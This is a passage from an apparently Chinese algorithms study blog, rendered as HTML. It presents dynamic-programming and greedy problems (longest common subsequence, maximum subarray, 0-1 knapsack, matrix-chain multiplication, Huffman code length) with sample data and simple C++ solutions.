class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int c[100][100];</span><br><span class="line">int b[100][100];</span><br><span class="line">char x[100],y[100];</span><br><span class="line">int lcslength(int m,int n)     //构造最优值，以及最优解需要的条件b[i][j]</span><br><span class="line">&#123;</span><br><span class="line">int i,j;</span><br><span class="line"><span class="keyword">for</span>(i=1;i&lt;=m;i++)c[i][0]=0;</span><br><span class="line"><span class="keyword">for</span>(i=1;i&lt;=n;i++)c[0][i]=0;</span><br><span class="line"><span class="keyword">for</span>(i=1;i&lt;=m;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=1;j&lt;=n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(x[i]==y[j])</span><br><span class="line">&#123;</span><br><span class="line">c[i][j]=c[i-1][j-1]+1;</span><br><span class="line">b[i][j]=1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i-1][j]&gt;=c[i][j-1])</span><br><span class="line">&#123;</span><br><span class="line">c[i][j]=c[i-1][j];</span><br><span class="line">b[i][j]=2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">c[i][j]=c[i][j-1];</span><br><span class="line">b[i][j]=3;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;                              </span><br><span class="line">void lcs(int i,int j)      //构造最优解</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i==0||j==0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b[i][j]==1)</span><br><span class="line">&#123;</span><br><span class="line">lcs(i-1,j-1);</span><br><span class="line">cout&lt;&lt;x[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b[i][j]==2)</span><br><span class="line">&#123;</span><br><span class="line">lcs(i-1,j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">lcs(i,j-1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int m,n;</span><br><span class="line">cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=m;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;x[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;y[i];</span><br><span class="line">&#125;</span><br><span class="line">lcslength(m,n);</span><br><span class="line">cout&lt;&lt;<span class="string">"length="</span>&lt;&lt;c[m][n]&lt;&lt;endl;</span><br><span class="line">lcs(m,n);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-最大子段和"><a href="#3-最大子段和" class="headerlink" title="3.最大子段和"></a><strong>3.最大子段和</strong></h2><p><strong>题目描述</strong><br>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。<br>提示：子段可为空集，答案为0</p><p><strong>输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。</span><br><span class="line">每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。</span><br><span class="line">接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</span><br><span class="line">1</span><br><span class="line">6</span><br><span class="line">2 -11 4 13 -1 2</span><br></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输出其对应的最大子段和。</span><br><span class="line">18</span><br></pre></td></tr></table></figure><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int a[100];</span><br><span class="line">int sum=0;</span><br><span class="line">int maxsum(int n)</span><br><span class="line">&#123;</span><br><span class="line">int b=0;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b&gt;0)</span><br><span class="line">&#123;</span><br><span class="line">b+=a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">b=a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b&gt;sum)</span><br><span class="line">&#123;</span><br><span class="line">sum=b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int k;</span><br><span class="line">cin&gt;&gt;k;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;a[i];</span><br><span class="line">&#125;</span><br><span class="line">maxsum(k);</span><br><span class="line">cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-0-1背包动态规划解法"><a href="#4-0-1背包动态规划解法" class="headerlink" title="4.0-1背包动态规划解法"></a><strong>4.0-1背包动态规划解法</strong></h2><p><strong>题目描述</strong><br>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><p><strong>输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</span><br><span class="line">接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost和价值</span><br><span class="line">（注意：结果可能超过int范围）</span><br><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对每组测试数据，输出其对应的所装物品的最大价值。</span><br><span class="line">15</span><br></pre></td></tr></table></figure><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int m[100][100]=&#123;0&#125;;</span><br><span class="line">int w[100];</span><br><span class="line">int v[100];</span><br><span class="line">int knapsack(int n,int c)</span><br><span class="line">&#123;</span><br><span class="line">int jmax=min(w[n]-1,c);</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;=jmax;i++)</span><br><span class="line">&#123;</span><br><span class="line">m[n][i]=0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=w[n];i&lt;=c;i++)</span><br><span class="line">&#123;</span><br><span class="line">m[n][i]=v[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=n-1;i&gt;=1;i--)</span><br><span class="line">&#123;</span><br><span class="line">jmax=min(w[i]-1,c);</span><br><span class="line"><span class="keyword">for</span>(int j=0;j&lt;=jmax;j++)</span><br><span class="line">&#123;</span><br><span class="line">m[i][j]=m[i+1][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int j=w[i];j&lt;=c;j++)</span><br><span class="line">&#123;</span><br><span class="line">m[i][j]=max(m[i+1][j],m[i+1][j-w[i]]+v[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int t;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)</span><br><span class="line">&#123;</span><br><span class="line">int c,n;</span><br><span class="line">cin&gt;&gt;c&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;w[i]&gt;&gt;v[i];</span><br><span class="line">&#125;</span><br><span class="line">knapsack(n,c);</span><br><span class="line">cout&lt;&lt;m[1][c]&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong><em>例题</em></strong></p><h2 id="5-节食的限制"><a href="#5-节食的限制" class="headerlink" title="5.节食的限制"></a><strong>5.节食的限制</strong></h2><p><strong>题目描述</strong><br> Bessie像她的诸多姊妹一样，因為从FarmerJohn的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。<br><strong>输入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。</span><br><span class="line">56 4</span><br><span class="line">15</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。</span><br><span class="line">56</span><br></pre></td></tr></table></figure><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#define inf 0x7fffffff</span></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int c; //最多吃的干草量</span><br><span class="line">int n; //有多少捆干草</span><br><span class="line">cin &gt;&gt; c &gt;&gt; n;</span><br><span class="line">int *wei = new int[n + 1];</span><br><span class="line">int m[50000];</span><br><span class="line"><span class="keyword">for</span> (int i = 1; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; wei[i];</span><br><span class="line">&#125;</span><br><span class="line">memset(m, 0, sizeof(m));</span><br><span class="line"><span class="keyword">for</span> (int i = 1; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (int j = c; j &gt;= wei[i]; j--) //j从大到小倒着遍历，如果大于重量，则说明可以放入，反之，则放弃这个物品，从下一个物品开始</span><br><span class="line">&#123;</span><br><span class="line">m[j] = max(m[j], m[j - wei[i]] + wei[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; m[c] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="矩阵连乘进阶"><a href="#矩阵连乘进阶" class="headerlink" title="矩阵连乘进阶"></a><strong>矩阵连乘进阶</strong></h2><p><strong>题目描述</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">给定n个矩阵&#123;A1,A2,...,An&#125;，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。</span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：</span><br><span class="line">第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。</span><br><span class="line">接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1&lt;r, c&lt;100。</span><br><span class="line">第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。</span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。</span><br><span class="line"></span><br><span class="line">数据保证结果不超过1e9。</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line"></span><br><span class="line">3 2</span><br><span class="line">A 10 100</span><br><span class="line">B 5 50</span><br><span class="line">C 100 5</span><br><span class="line">ACB</span><br><span class="line">ABC</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line"></span><br><span class="line">7500</span><br><span class="line">MengMengDa</span><br></pre></td></tr></table></figure><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int m[100][100]=&#123;0&#125;;</span><br><span class="line">int p[200];</span><br><span class="line">int maxchain(int n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">m[i][i]=0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int r=2;r&lt;=n;r++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n-r+1;i++)</span><br><span class="line">&#123;</span><br><span class="line">int j=i+r-1;</span><br><span class="line">m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j];</span><br><span class="line"><span class="keyword">for</span>(int k=i+1;k&lt;j;k++)</span><br><span class="line">&#123;</span><br><span class="line">int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j];</span><br><span class="line"><span class="keyword">if</span>(t&lt;m[i][j])</span><br><span class="line">&#123;</span><br><span class="line">m[i][j]=t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> m[1][n];</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n,m;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">char chain[30];</span><br><span class="line">int h[30];</span><br><span class="line">int l[30];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;chain[i]&gt;&gt;h[i]&gt;&gt;l[i];</span><br><span class="line">&#125;</span><br><span class="line">char <span class="built_in">test</span>[3][105];</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;<span class="built_in">test</span>[i];</span><br><span class="line">&#125;</span><br><span class="line">int key;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int j=0;j&lt;n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">test</span>[i][0]==chain[j])</span><br><span class="line">&#123;</span><br><span class="line">key=j;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">p[0]=h[key];</span><br><span class="line">p[1]=l[key];</span><br><span class="line">int len=strlen(<span class="built_in">test</span>[i]);</span><br><span class="line">int flag=1;</span><br><span class="line"><span class="keyword">for</span>(int k=1;k&lt;len;k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int j=0;j&lt;n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">test</span>[i][k]==chain[j])</span><br><span class="line">&#123;</span><br><span class="line">key=j;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p[k]==h[key])</span><br><span class="line">&#123;</span><br><span class="line">p[k+1]=l[key];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">"MengMengDa"</span>&lt;&lt;endl;</span><br><span class="line">flag=0;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag==1)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;maxchain(len)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="贪婪算法"><a href="#贪婪算法" class="headerlink" title="贪婪算法"></a>贪婪算法</h1><h2 id="1-哈夫曼编码"><a href="#1-哈夫曼编码" class="headerlink" title="1.哈夫曼编码"></a><strong>1.哈夫曼编码</strong></h2><p><strong>题目描述</strong><br>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度。</p><p><strong>输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</span><br><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure><p><strong>思路</strong><br>要构造哈夫曼编码首先就必须要计算出每个字母出现的频率，扫描一遍即可;接下来就需要用这些频率来构造哈夫曼树，在这里需要使用优先队列这个数据结构，将频率全部push进入优先队列按从小到大排列后，使用贪心算法，每次都是将最小的两个频率拿出来构造哈夫曼树，两数的和再次push进队列，重复进行即可。</p><p><strong>code</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;queue&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int t;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)</span><br><span class="line">&#123;</span><br><span class="line">char s[2000];</span><br><span class="line">cin&gt;&gt;s;</span><br><span class="line">int fre[26]=&#123;0&#125;;</span><br><span class="line">int len=strlen(s);</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;len;i++)</span><br><span class="line">&#123;</span><br><span class="line">fre[s[i]-<span class="string">'a'</span>]++;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt;q;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;26;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(fre[i]&gt;0)</span><br><span class="line">&#123;</span><br><span class="line">q.push(fre[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int sum=0;</span><br><span class="line"><span class="keyword">while</span>(q.size()&gt;=2)</span><br><span class="line">&#123;</span><br><span class="line">int a=q.top();</span><br><span class="line">q.pop();</span><br><span class="line">int b=q.top();</span><br><span class="line">q.pop();</span><br><span class="line">sum+=(a+b);</span><br><span class="line">q.push(a+b);</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-最优装载"><a href="#2-最优装载" class="headerlink" title="2.最优装载"></a><strong>2.最优装载</strong></h2><p><strong>题目描述</strong><br>轮船载重有限将尽可能多的集装箱装上轮船</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line"></span><br><span 